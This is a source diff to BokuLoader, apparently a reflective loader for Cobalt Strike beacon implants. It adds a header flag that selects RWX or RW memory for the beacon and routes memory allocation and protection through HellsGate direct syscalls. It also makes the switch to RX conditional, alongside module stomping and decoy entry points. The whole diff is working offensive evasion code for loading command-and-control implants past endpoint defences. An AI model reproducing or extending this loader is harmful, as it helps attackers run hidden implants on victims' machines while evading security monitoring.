@@ -18,6 +18,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     getApis(&api);
 
+    checkUseRWX(&rdll_src);
+
     rdll_dst.dllBase = NULL;
     // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
     if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x4){
@@ -35,7 +37,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             oldprotect = 0;
             // NtProtectVirtualMemory syscall
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
             rdll_dst.dllBase = base;
@@ -51,7 +53,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
             oldprotect = 0;
             rdll_dst.dllBase = base;
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
         }
     }
     else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x2){
@@ -63,7 +65,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                 oldprotect = 0;
                 rdll_dst.dllBase = base;
                 HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
+                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
             }
         }
     }
@@ -72,7 +74,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         base = NULL;
         size = rdll_src.size;
         HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
-        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, rdll_src.BeaconMemoryProtection);
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
         rdll_dst.dllBase = base;
@@ -86,14 +88,16 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     //rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     rdll_dst.EntryPoint = checkFakeEntryAddress_returnReal(&rdll_src, &rdll_dst);
 
-    // Change memory protections of loaded beacon .text section to RX
-    oldprotect = 0;
-    base = rdll_dst.TextSection;
-    size = rdll_dst.TextSectionSize;
-    newprotect = PAGE_EXECUTE_READ;
-    // NtProtectVirtualMemory syscall
-    HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-    ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
+    // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
+    if(rdll_src.BeaconMemoryProtection == PAGE_READWRITE){
+        oldprotect = 0;
+        base = rdll_dst.TextSection;
+        size = rdll_dst.TextSectionSize;
+        newprotect = PAGE_EXECUTE_READ;
+        // NtProtectVirtualMemory syscall
+        HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
+        ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
+    }
 
     // DLL_PROCESS_ATTACH 1
     // The DLL is being loaded into the virtual address space of the current process. 
@@ -102,6 +106,18 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then it beacon will return to us.
     ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
     return rdll_dst.EntryPoint;
+}
+
+// OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
+void checkUseRWX(Dll * raw_beacon_dll_struct){
+    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER            = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
+    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER           = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+    if (raw_beacon_dll_OPTIONAL_HEADER->Win32VersionValue == 0xBC){
+        raw_beacon_dll_struct->BeaconMemoryProtection = PAGE_EXECUTE_READWRITE;
+    }else{
+        raw_beacon_dll_struct->BeaconMemoryProtection = PAGE_READWRITE;
+    }
 }
 
 // if the Malleable PE C2 profile has `set entry_point` then the OPTIONAL_HEADER->EntryPoint is a decoy and the real entry point is at OPTIONAL_HEADER->LoaderFlags
